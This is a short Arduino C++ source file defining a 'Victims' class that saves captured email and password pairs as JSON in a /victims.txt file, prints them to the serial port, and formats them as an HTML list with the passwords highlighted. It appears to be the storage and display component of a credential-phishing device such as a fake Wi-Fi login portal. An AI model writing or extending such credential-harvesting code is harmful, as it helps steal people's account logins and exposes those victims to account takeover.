#include <Arduino.h>
#include <ArduinoJson.h>
#include "Arquivomaneger.h"
using namespace std;


class Victims {
private:
    Arquivomaneger* arquivo;
    JsonDocument doc;   

public:

    Victims(){
        arquivo = new Arquivomaneger("/victims.txt");
        String victimsFullText = arquivo->readFile();
        Serial.println(victimsFullText);
        deserializeJson(doc, victimsFullText);
    }

    void addVictim(String user, String pass){
        JsonObject victim = doc["victims"].add<JsonObject>();
        victim["username"] = user;
        victim["password"] = pass;

        String out;
        serializeJson(doc, out);
        Serial.println(out);
        arquivo->writeFile(out);
    }

    void clearVictims(){
        arquivo->clearFile();
    }


    String returnFullTextFormatted(){
        string text = "";

        JsonArray victimsJson = doc["victims"].as<JsonArray>();

        for (int i = 0; i < victimsJson.size(); i++){
            string user = victimsJson[i]["username"];
            string pass = victimsJson[i]["password"];

            text += "<li>Email:  <b>" + user + "</b></br>Password:  <b style=color:#ea5455;>" + pass + "</b></li>";            
        }

        return String(text.c_str());
    }
  
};
